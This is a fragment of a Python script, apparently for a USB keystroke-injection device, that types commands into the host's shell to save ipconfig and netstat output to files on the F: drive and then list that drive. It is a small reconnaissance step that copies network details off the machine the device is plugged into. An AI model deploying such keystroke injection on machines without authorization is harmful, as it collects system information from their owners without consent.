...
try:
    ...
    # Command to create iptext.txt and save to F: drive
    keyboard_layout.write("ipconfig > F:\\iptext.txt")
    keyboard.send(Keycode.ENTER)
    time.sleep(1)
    
    # Command to create netfile.txt and save to F: drive
    keyboard_layout.write("netstat > F:\\netfile.txt")
    keyboard.send(Keycode.ENTER)
    time.sleep(1)
    
    # Command to list files in F: drive (for verification)
    keyboard_layout.write("dir F:\\")
    keyboard.send(Keycode.ENTER)
    time.sleep(1)
